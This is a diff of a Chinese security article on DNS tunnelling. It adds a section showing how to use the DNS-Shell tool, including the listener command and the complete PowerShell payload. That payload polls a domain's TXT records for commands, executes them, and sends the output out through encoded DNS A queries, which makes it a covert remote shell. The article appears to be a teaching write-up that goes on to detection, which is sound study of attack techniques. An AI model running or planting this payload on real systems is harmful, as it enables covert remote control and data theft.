@@ -86,8 +86,48 @@ DNS协议报文格式
 
 控制机 CentOS7：  111.222.333.444
 
+我们用到的工具
+[DNS-Shell](https://github.com/sensepost/DNS-Shell)，我们在 CentOS7 上面执行  python DNS-shell.py -l -r test.njcx.bid ，接收由受控机过来的shell，执行后会生成一个 powershell的payload,保存为 ps1 Windows执行即可收到shell
 
-https://github.com/sensepost/DNS-Shell
+```
+$url = "test.njcx.bid";
+function execDNS($cmd) {
+$c = iex $cmd 2>&1 | Out-String;
+$u = [system.Text.Encoding]::UTF8.GetBytes($c);
+$string = [System.BitConverter]::ToString($u);
+$string = $string -replace '-','';
+$len = $string.Length;
+$split = 50;
+$repeat=[Math]::Floor($len/$split);
+$remainder=$len%$split;
+if($remainder){ $repeatr = $repeat+1};
+$rnd = Get-Random;$ur = $rnd.toString()+".CMDC"+$repeatr.ToString()+"."+$url;
+$q = nslookup -querytype=A $ur;
+for($i=0;$i-lt$repeat;$i++){
+    $str = $string.Substring($i*$Split,$Split);
+    $rnd = Get-Random;$ur1 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
+    $q = nslookup -querytype=A $ur1;
+};
+if($remainder){
+    $str = $string.Substring($len-$remainder);
+    $i = $i +1
+    $rnd = Get-Random;$ur2 = $rnd.toString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
+    $q = nslookup -querytype=A $ur2;
+};
+$rnd=Get-Random;$s=$rnd.ToString()+".END."+$url;$q = nslookup -querytype=A $s;
+};
+while (1){
+   $c = Get-Random;
+   Start-Sleep -s 3
+   $u=$c.ToString()+"."+$url;$txt = nslookup -querytype=TXT $u | Out-String
+   $txt = $txt.split("`n") | %{$_.split('"')[1]} | Out-String
+   if ($txt -match 'NoCMD'){continue}
+   elseif ($txt -match 'exit'){Exit}
+   else{execDNS($txt)}
+}   
 
+```
+
+![dnsshell](../images/dnsshell.png)
 
 #### 检测
